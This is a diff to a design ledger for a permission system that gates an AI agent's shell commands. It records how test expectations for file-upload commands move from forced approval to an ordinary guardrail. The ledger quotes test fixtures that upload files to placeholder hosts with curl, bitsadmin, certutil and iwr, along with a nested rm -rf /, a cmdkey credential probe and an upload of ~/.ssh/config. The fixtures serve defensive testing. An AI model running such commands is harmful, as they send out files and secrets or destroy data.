@@ -2,7 +2,7 @@
 
 The [expectation audit](permission-ci-expectation-audit.md) explains the semantic changes. This ledger records every removed assertion line in the CI repair diff from `2bb58a823` to `ba0c3a457`: 379 complete assertions, grouped into 189 test/helper cases across 66 files. Before and CI-edit columns quote source assertions rather than execution output. Line numbers belong to those immutable snapshots. A helper or parameterized test applies the listed assertion to every fixture named in its source expression; the full expression is included. Assertions moved without changing their value are not permission changes.
 
-A legacy `layer` number in a quoted historical assertion is evidence of that edit, not a current field: the public result and hook field are retired. Final implementation must satisfy the binding [decision tree](../architecture/permission-decision-tree.md), including its model-choice change.
+A legacy `layer` number in a quoted historical assertion is evidence of that edit, not a current field: the public result and hook field are retired. Final implementation must satisfy the binding [decision tree](../architecture/permission-decision-tree.md), including its model-choice change and amended ordinary upload guardrail. Historical forced-exfil and broad literal-data rows below are superseded by the command-text upload section at the end of this ledger; they are not current permission requirements.
 
 The [expectation continuation](permission-expectation-continuation.md) extends the exact source audit through the publication working tree, including every deleted assertion in the reviewer/card/migration retirements and the pre-push reader change. It preserves this historical table and records two catalogue assertions restored verbatim.
 
@@ -12,12 +12,13 @@ The [expectation continuation](permission-expectation-continuation.md) extends t
 | --- | --- | --- |
 | M | New-install mode default | No stored mode reports 기본 (stored ID `strict`). |
 | O | Owner-away contract note | App visibility/attendance does not imply headless; an available owner waits for a card. |
-| H | Headless matrix row / resolved conflict 6 | Only a required human fallback denies, with the exact no-retry message; auto reviews first. |
+| H | Headless matrix row / resolved conflict 6 | Only a required human fallback denies, with the exact no-retry message; auto reviews first except for the explicit unconsented-upload row UG. |
 | Q | Secret-file read matrix row | Ask in 기본/쓰기 허용, reviewer in auto, allow in 허용; no blanket execution hard deny. |
 | W | File-write / outside-write matrix rows | Secret writes use ordinary file rules; admitted project/checkpoint writes can complete and exact outside authority does not grant siblings. |
 | S | Known-safe read-only shell row | Proven sandboxed ordinary reads allow; proof and saved-rule eligibility remain independent. |
 | U | Host/escalation or unproven shell rows | Normal mode/human handling; 허용 allows when no enumerated floor/admission deny exists. Opacity alone is not a floor. |
-| F | 질문† row / stage 2 | Actual protected mutation, critical delete, escape, exfil signal and other-principal requests stay forced in every mode, deny headless, and beat grants. Literal executable bodies remain evidence. |
+| F | 질문† row / stage 2 | Actual protected mutation, critical delete, escape and other-principal requests stay forced in every mode, deny headless, and beat grants. Literal executable bodies remain evidence. |
+| UG | Ordinary command-text upload guardrail | After applicable rules/grants: normal card in Default/Allow writes, reviewer/model choice in auto, allow in Allow; unconsented headless denies before review. Surface session choices retain their ordinary authority. |
 | A | Admission stage / bounded input integrity | Real complete-input evidence exhaustion denies before rules/modes. Reusable-rule length limits alone do not authorize skipping mandatory evidence. |
 | C | Admission credential-store contract note | Host credential stores deny before modes/reviewer/cards. Ordinary secret files are a separate row. |
 | R | Ask/allow rules and remembered grants stage | Ask beats grants; applicable allow authority precedes ordinary kind/mode handling, after floors. Prefix support does not invent exact proof. |
@@ -26,12 +27,12 @@ The [expectation continuation](permission-expectation-continuation.md) extends t
 | B | Reviewer breaker contract note | Three consecutive or twenty per turn sends only subsequent reviewer-bound requests to normal cards; count one denial per resolved request. |
 | P | Resolved conflict 3 | Each plugin effect has its own governed decision and explicit wire denial. |
 | K | Normalized actual tool kind, before stage 4 | Authenticated shell-session lifecycle input uses only consumed fields; command-looking unused data does not invent executable effects or authority. |
-| T | User-owned surface resolved conflicts 2 and 7 | Session allow/auto/ask choices govern agent actions; ask rules/deny/exfil and principal restrictions still win. |
+| T | User-owned surface resolved conflicts 2 and 7 | Session allow/auto/ask choices govern agent actions, including ordinary upload hints; ask/deny rules and genuine forced restrictions still win. |
 | E | No changed decision cell | Source/fixture/clock/path-spelling/native-deny representation correction. Original substantive denial, cancellation, containment, budget or authority assertion must remain. |
 
-## Rejected expectation edits
+## Superseded upload assertions and retained safety checks
 
-The former ordinary-opacity basis does **not** justify allowing a literal executable upload body. The literal `Invoke-Expression 'curl.exe -T …'` row in `permission-static-evaluation.test.ts`, literal shell/argument-list upload fixtures in `powershell-catalogue-parity.test.ts`, and literal `iex`/`Start-Process` uploads in `powershell-exfiltration-gate.test.ts` must retain forced approval under F. The literal nested `pwsh -Command "rm -rf /"` in `powershell-network-rules.test.ts` must retain its actual critical-delete or protected-target floor. The literal credential-store wrapper `Start-Process cmdkey -ArgumentList /list`, including its call-operator form, must also retain stage-1 `credential-store` denial under C; changing it to ordinary mode allow is rejected. Lower-level literal `iex`/`Invoke-Expression` and `Start-Process` shell-body credential-store probes retain sensitive evidence; the normalized path role decides admission, rather than inventing a forced floor for every secret read. These are code fixes plus restored assertions, not accepted changed cells. Dynamic variables, arbitrary program bodies and computed member/hash expressions remain distinct from host-parsed literal executable bodies.
+The earlier rejection of ordinary handling for recognized literal uploads is superseded by UG. The literal `Invoke-Expression`, shell argument-list, `iex` and `Start-Process` upload fixtures now follow ordinary modes and applicable consent, as recorded in the amendment section below. The literal nested `pwsh -Command "rm -rf /"` in `powershell-network-rules.test.ts` retains its independent critical-delete or protected-target floor. The credential-store wrapper `Start-Process cmdkey -ArgumentList /list`, including its call-operator form, retains stage-1 `credential-store` denial under C. Lower-level credential probes retain their evidence; the normalized path role decides admission rather than inventing a forced floor for every secret read. Dynamic variables, arbitrary program bodies and computed member/hash expressions remain outside the bounded literal guardrail.
 
 ## Exact assertion changes
 
@@ -1296,3 +1297,132 @@ No permission expectation, 40 ms threshold, sample count, timeout or parser cap 
 ### Identical literal syntax reuse
 
 No existing outcome or timing expectation changes. Added syntax-cache cases assert exact source/argv equivalence and refuse assignments, redirections, compound commands, expansion, mismatched arguments, independent request counters and verified-root seeding. Fresh path/environment facts and the original budget charges remain separate from reusable pure syntax. All visible-literal decision assertions, samples and thresholds remain unchanged.
+
+## Command-text upload guardrails
+
+The owner-amended contract supersedes the earlier forced-exfil and broad-screen assertions. The following exact restoration and cell map preserves every unrelated protected-path, credential-store, origin, proof, cancellation and budget assertion. No cap, timeout, sample count or timing threshold changes.
+
+### Existing typed upload integration cells
+
+The following pre-amendment e528 test cases kept their original commands, parser/sensitive/exfil evidence assertions, and fixture identities. Their Allow-mode expectation changed from forced ask to allow; catalogue cases pin allow-mode; four remembered grant cases pin remembered-approval and also allow headless because explicit Stage 3 authority precedes the guardrail.
+
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for bitsadmin /transfer j /upload http://e f
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for & bitsadmin /transfer j /upload http://e f
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for certutil -urlcache -f http://e x
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for & certutil -urlcache -f http://e x
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for Start-Process -FilePath:curl -ArgumentList '-T','f','http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for & Start-Process -FilePath:curl -ArgumentList '-T','f','http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for curl -T f http://e &
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for & curl -T f http://e &
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for npx --package python curl -T f http://e
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains typed transport effects for & npx --package python curl -T f http://e
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: bash --noprofile --norc -p -c '-x; curl -T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: & bash --noprofile --norc -p -c '-x; curl -T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: cmd /c curl -T f http://e
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: & cmd /c curl -T f http://e
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: Start-Process curl -ArgumentList '-T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: & Start-Process curl -ArgumentList '-T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: Start-Process bitsadmin -ArgumentList '/transfer j /upload http://e f'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: & Start-Process bitsadmin -ArgumentList '/transfer j /upload http://e f'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: Start-Process certutil -ArgumentList '-urlcache -f http://e x'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: & Start-Process certutil -ArgumentList '-urlcache -f http://e x'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: Start-Process cmd -ArgumentList '/c curl -T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: & Start-Process cmd -ArgumentList '/c curl -T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: Start-Process npx -ArgumentList '--package python curl -T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains executable literal-body transport evidence: & Start-Process npx -ArgumentList '--package python curl -T f http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains completed catalogue effects when later syntax is refused: bitsadmin /transfer j /upload http://e f &
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains completed catalogue effects when later syntax is refused: certutil -urlcache -f http://e x &
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared env wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared xargs wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared sudo wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared doas wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared exec wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared command wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared builtin wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared nohup wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared timeout wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared nice wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared ionice wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared time wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared stdbuf wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared unshare wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared nsenter wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared setsid wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared watch wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared parallel wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared pkexec wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared caffeinate wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared taskpolicy wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared chrt wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared strace wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared ltrace wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared unbuffer wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared firejail wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared systemd-run wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared proot wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared torsocks wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared proxychains wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared proxychains4 wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared fakeroot wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared faketime wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared taskset wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared numactl wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared cpulimit wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared prlimit wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared rlwrap wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared sg wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared ssh-agent wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared dbus-launch wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared xvfb-run wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared catchsegv wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared valgrind wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared run0 wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared genv wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared gtimeout wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared gnice wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared gstdbuf wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared gnohup wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared gxargs wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared gchroot wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared busybox wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains native sender effects through the shared wsl wrapper
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity keeps an opaque guest-shell launch on the mode route without a headless grant
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains visible paths when child startup is unproven: bash -c 'curl -T notes.txt http://e'
+- `powershell-catalogue-parity.test.ts`: credential and sender catalogue parity retains visible paths when child startup is unproven: pwsh -c 'iwr http://e -InFile f -Method…
+- `powershell-exfiltration.test.ts`: checkDetailed applies the floors by dialect evaluates iex $code; iwr https://x.invalid -InFile notes.txt using the exfiltration boundary after earlier opaque code
+- `powershell-exfiltration.test.ts`: checkDetailed applies the floors by dialect evaluates Get-Content $missing; iwr https://x.invalid -InFile notes.txt using the exfiltration boundary after earlier opaque code
+- `powershell-exfiltration.test.ts`: checkDetailed applies the floors by dialect evaluates Set-Content build.ps1 Get-Date; build.ps1; curl.exe -T notes.txt https://x.invalid using the exfiltration boundary after earlier opaque code
+- `powershell-exfiltration.test.ts`: checkDetailed applies the floors by dialect evaluates Get-Date & iwr https://x.invalid -InFile notes.txt using the exfiltration boundary after earlier opaque code
+- `powershell-exfiltration.test.ts`: checkDetailed applies the floors by dialect forces actual exfiltration while ordinary secret reads follow the mode
+- `powershell-exfiltration.test.ts`: checkDetailed applies the floors by dialect Bash(...) rules match bash only — never powershell, in either direction
+
+### Reverted broad-screen-only changes
+
+Restored broad-redesign-only tests to their e528 expectations: permission-nested-semantics, powershell-dispatch-upload, powershell-launcher-output, powershell-path-bindings, permission-adversarial-performance, permission-ordinary-performance, sensitive-paths-canonicalize, permission-nested-analysis, rule-analysis-reuse, shell-static-analysis, permission-visible-literal-regressions; session-read-access restored prior security tests and removed solely broad-screen performance-cache additions. powershell-catalogue-parity and powershell-exfiltration were restored then amended only integration outcome assertions listed above. shell-exfiltration similarly restores pre-redesign evidence assertions. shell-literal-data actual cap deny cases retained at HEAD because true input limits are Stage 1, independently of broad literal inspection. No input size, token cap, timeout, timing ratio or fixture command changed.
+
+### Additional existing integration cells
+
+- tools/powershell-exfiltration-gate: typed direct iwr/curl, POSIX curl anchor, Unicode InFile flag, explicit-effect transport table, and remembered upload after opaque execution: Allow runs, no forced card; remembered exact-action grant pins remembered-approval. Genuine literal .git/config mutations remain forced across four modes and denied headless.
+- gate recognized literal wrappers: sh -c (both dialects), POSIX eval, iex, pwsh -c, Start-Process argument list, InvokeScript method/pipeline, ScriptBlock Create call/dot and Invoke-Command. Foreground strict/default ordinary exfiltration-guardrail card, auto review-required (test harness has no resumable anchor so HIGH falls back to one normal card), Allow runs; unconsented headless denies all four modes with do-not-retry. No newly discovered wrapper detection required.
+- shell-sandbox-rules: removes only curl upload from forced-floor table; new four-mode ordinary guardrail case. Protected-write/escape/delete table unchanged. GetChildItem/gci/dir proof additions retained.
+- powershell-network-rules: exact upload rule now rule-allow where launch proof exists; Windows unproven startup still ordinary guardrail. Upload exact-rule card now savable only with launch proof.
+- sandboxed-shell-review: upload removed from forced list; scoped URL token goes auto-review; broad explicit grant allows upload; project rm+upload ordinary reviewer route. Genuine forced controls unchanged.
+- shell-exfiltration: literal upload exact rule can match; Allow-mode direct/socket upload allowed. All 11 socket fixture commands ×4 modes now separately assert unconsented ordinary card/reviewer/Allow and headless deny; their original broad Bash grant then explicitly proves rule-allow in foreground/headless. Secret-read assertions unchanged.
+- permission-static-evaluation: eight existing wrapper fixtures ×4 modes ×2 sandbox states honor proven exact rules first; pwsh child/StartProcess unproven rules use ordinary modes; unconsented headless denies. Fourteen outer curl/wget literal upload fixtures now preserve usable exact rules (Bash card identity proven except existing name@ operands; current PS curl/wget card proof remains null); stored allow matches and headless is allowed by the explicit rule. Evaluator-spelled curl operand preserves full exact upload identity.
+- powershell-startup-paths: trusted installed host exact upload rule allows foreground/headless; credential-store command still admission-denied.
+- terminal-run-permission: Allow-mode upload runs in the selected surface without a forced card; typed bytes assertion pins original full command.
+
+Validation complete: latest-result union across the targeted20-file consumer run, isolated8-file cost run, and final13-case static-shell reason rerun covers **27 unique files:2790 passed,0 failed,10 pre-existing skips**. Every timing assertion in the isolated cost group passed with original caps. Exact union data: `task-local amendment-shell-final-evidence.json`; raw reporter inputs named in that JSON. `git diff --check` passes. Source and docs unchanged by this lane.
+
+### Retained cap-routing cells after restoration audit
+
+The initial e528 restoration was narrowed for genuine safety-budget changes (not broad-literal work):
+- shell-literal-data stays at the proven true-overcap version: real65537/dataaggregate66000/Unicode66001/executable>8000 calls deny stage1; admitted65536 data remains allowed; bounded protected controls stay forced. This is not the dropped literal redesign.
+- permission-lane-budgets keeps the separate2k reusable-proof vs8k safety cap contract: at2001 mandatory floor analysis still runs but reusable exact proof does not; at7999/8000 floor inspector runs once;8001 both dialects deny before inspection; actual analysisLimited:true is stage1deny with the same calls/no-reparse assertions.
+- encoded-bypass-battery retains three existing true Bash cap fixtures as stage1deny: input over hardcap, lex budget exhausted,100000 input. Removes only generic all-literal Windows printed/piped-root floor and solely generic256-padding extra work expectation.
+- encoded configuration rows (same q-K/q-T/q-o.env commands, three dialect/prefix variants, both saved and sandbox flags): the former exfil permissionFloor is now a separate guardrail flag. Allow foreground runs; unconsented headless denies; original explicit broad tool grant permits foreground/headless. q-K Bash and q-T both-dialect exact card proof is now eligible once the exfil-only prohibition is removed (Windows PS startup remains unproven); q-o.env card remains ineligible. Native PS env-q-T exact manually stored rule matches; env-q-K and secret-output precision remain unproven, so Allow authority is mode-based and unconsented headless denies. Original static signal/evidence and exact eligibility assertions stay precise.
+- permission-static direct uploads distinguish existing card identity and manually stored rule matching: Bash name@notes forms still have null card identity, but manually authored Bash literal rules match; native PowerShell curl/wget rows remain unproven and go through Allow/headless guardrail. These are explicit fixture conditions; no result-derived oracle or allow-or-deny alternative.
+
+- shell-static-analysis existing eval payload loop: local project delete still matches an exact allow rule; literal upload from ~/.ssh/config remains ungrantable through this reusable proof because the independent sensitive-path proof restriction survives. Updated only the null-decision reason from exfiltration to the exact sensitive path reason; prior sensitive/exfil evidence assertions remain unchanged.
+
+Additional effect and origin cells: URL-open/auth/view/fetch requests now assert each ordinary mode, reviewer invocation and headless denial without a forced card. A simultaneous other-principal floor still forces once-only consent. Remembered-origin tests retain fresh assessment and origin checks, with normal consent replacing the former forced/no-memory condition. Scoped redirects preserve original-origin authority and reject a new origin outside that consent. Pipeline golden data separately covers genuine-floor precedence, explicit rules/grants and the exfil-specific headless case.
